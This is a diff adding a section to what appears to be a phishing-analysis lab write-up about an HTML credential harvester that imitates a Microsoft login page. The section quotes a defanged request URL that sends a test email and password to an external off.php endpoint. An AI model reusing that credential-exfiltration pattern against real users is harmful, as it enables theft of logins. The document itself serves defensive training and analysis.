@@ -110,3 +110,27 @@ The decoded source was then searched for references to `logo` to identify the im
 Identifying the Microsoft-branded resource provides additional evidence that the HTML attachment was designed to imitate a Microsoft authentication page.
 
 This step demonstrates how static source-code analysis can reveal artifacts that may not be immediately visible when viewing the rendered phishing page.
+
+
+### 7. Credential Submission Network Analysis
+
+![Credential submission network request](../evidence/screenshots/html-credential-harvester/07-credential-submission-network-request.png)
+
+I opened **Developer Tools** and selected the **Network** tab to observe the web page's network activity. I then submitted the test password **`test`** and examined the resulting `off.php` request.
+
+The request showed that the phishing page sends the entered credentials to an external domain. Both the email address and submitted test password were included directly in the request URL, demonstrating how the phishing page attempts to capture and transmit a victim's credentials.
+
+**Observed Request URL (defanged):**
+
+`hxxp://alia[.]typentfs[.]xyz/off.php?aaa=contact%40securityblue.team&ooo=test%40email.com&password=test&s1=`
+
+The request contains several important artifacts:
+
+- **Destination domain:** `alia[.]typentfs[.]xyz`
+- **Endpoint:** `/off.php`
+- **Targeted email:** `contact@securityblue.team`
+- **Submitted test password:** `test`
+
+This network behavior provides strong evidence that the HTML attachment functions as a **credential harvester**. Rather than simply displaying a fake Microsoft login page, the form attempts to transmit information entered by the user to external infrastructure.
+
+The URL has been defanged in this documentation to prevent accidental navigation.
